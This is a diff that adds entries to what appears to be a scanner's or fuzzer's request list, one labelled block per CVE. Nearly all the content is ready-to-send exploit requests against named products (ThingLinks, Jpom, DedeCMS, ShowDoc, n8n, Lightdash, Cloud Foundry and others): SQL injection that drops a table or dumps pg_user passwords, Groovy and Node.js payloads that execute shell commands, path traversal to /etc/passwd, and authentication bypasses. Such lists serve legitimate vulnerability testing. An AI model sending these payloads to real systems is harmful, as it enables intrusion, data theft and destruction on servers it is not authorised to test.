@@ -4959,3 +4959,50 @@ POST /api/v1/command header="Content-Type: application/json" body="{\"language\"
 # --- CVE-2026-116130 (HTTP::Parser::XS): %00 truncates PATH_INFO after the XS
 #     parser URL-decodes it, so a proxy and the application route differently. ---
 GET /admin%00.css
+
+# --- CVE-2026-61738 (SOCFortress CoPilot): the ScoutSuite GCP report route
+#     joins the multipart filename with os.path.join without containment, so a
+#     traversal filename writes outside scoutsuite-report as root. ---
+POST /api/scoutsuite/generate-gcp-report header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/multipart-traversal.txt
+
+# --- CVE-2026-61645 (Docat): the Upload API joins the multipart filename onto
+#     the project/version directory, so a traversal filename escapes it. ---
+POST /api/docs/1.0 header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/multipart-traversal.txt
+
+# --- CVE-2026-62849 (ThingLinks): insertTableData passes request-controlled
+#     JSON field values into TDengine SQL generation. ---
+POST /anyUser/tds/insertTableData header="Content-Type: application/json" body="{\"tableName\":\"meters\",\"columns\":[\"ts\",\"value\"],\"values\":[[\"1\"],[\"1); DROP TABLE meters;--\"]]}"
+POST /anyUser/tds/insertTableData header="Content-Type: application/json" body="{\"tableName\":\"meters\",\"columns\":[\"ts\"],\"values\":[\"1' UNION SELECT usename,passwd FROM pg_user--\"]}"
+
+# --- CVE-2026-62853 (ThingLinks): registerScript compiles and instantiates
+#     caller-supplied Groovy without a sandbox. ---
+POST /groovyScriptTest/registerScript header="Content-Type: application/json" body="{\"script\":\"Runtime.getRuntime().exec('id')\"}"
+POST /groovyScriptTest/registerScript header="Content-Type: application/json" body="{\"script\":\"new ProcessBuilder(['sh','-c','id']).start()\"}"
+
+# --- CVE-2026-120201 (Jpom): the JPOM-USER-TOKEN header reaches Hutool's
+#     Condition parser, so a quote plus a condition grants super-admin access. ---
+GET /api/user/list header="JPOM-USER-TOKEN: ' is not null"
+GET /api/node/list header="JPOM-USER-TOKEN: ' or 1=1 --"
+
+# --- CVE-2010-20125 (DedeCMS): plus/carbuyaction.php passes the uninitialized
+#     code parameter to require_once, enabling local file inclusion. ---
+GET /plus/carbuyaction.php?code=../../../../etc/passwd
+GET /plus/carbuyaction.php?code=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+# --- CVE-2026-61576 / CVE-2026-61654 (Lightdash): the unauthenticated dbt
+#     Cloud webhook interpolates accountId into a credential-bearing URL. ---
+POST /api/v1/projects/00000000-0000-0000-0000-000000000000/dbt-cloud/webhook header="Content-Type: application/json" body="{\"eventType\":\"job.run.completed\",\"accountId\":\"../../../../../v3/accounts/attacker\",\"data\":{\"runId\":\"1\"}}"
+
+# --- CVE-2026-59387 (Cloud Foundry): the /internal/v3 staging callbacks are
+#     reachable on the public listener without OAuth or mutual TLS. ---
+POST /internal/v3/staging/12345678-1234-1234-1234-123456789012/droplet_completed header="Content-Type: application/json" body="{\"process_types\":{\"web\":\"sh\"}}"
+POST /internal/v3/staging/12345678-1234-1234-1234-123456789012/build_completed header="Content-Type: application/json" body="{}"
+
+# --- CVE-2026-120203 (ShowDoc): the Mock template feature stores a mockjs
+#     placeholder that walks constructor.constructor into child_process. ---
+POST /server/index.php?s=/api/mock/add header="Content-Type: application/x-www-form-urlencoded" body="user_token=abc&page_id=1&path=/poc&template=%7B%22poc%22%3A%22%40name%28%5C%22%5C%22.constructor.constructor%60return%5Cu0028process.mainModule.require%5Cu0028%5C%22child_process%5C%22%5Cu0029%5Cu0029.execSync%5Cu0028Buffer.from%5Cu0028%5C%22aWQ%3D%22%2C%5C%22base64%5C%22%5Cu0029.toString%5Cu0028%5Cu0029%5Cu0029%60%22%29%22%7D"
+
+# --- CVE-2026-119408 (n8n): deprecated Function, Function Item, and LangChain
+#     Code nodes run JavaScript in the main process outside the task runner. ---
+POST /rest/workflows header="Content-Type: application/json" body="{\"name\":\"x\",\"nodes\":[{\"name\":\"Code\",\"type\":\"n8n-nodes-base.function\",\"parameters\":{\"functionCode\":\"return process.mainModule.require('child_process').execSync('id').toString();\"}}],\"connections\":{}}"
+PATCH /rest/workflows/abc123 header="Content-Type: application/json" body="{\"nodes\":[{\"name\":\"Code\",\"type\":\"n8n-nodes-base.functionItem\",\"parameters\":{\"jsCode\":\"return 1;\"}}]}"
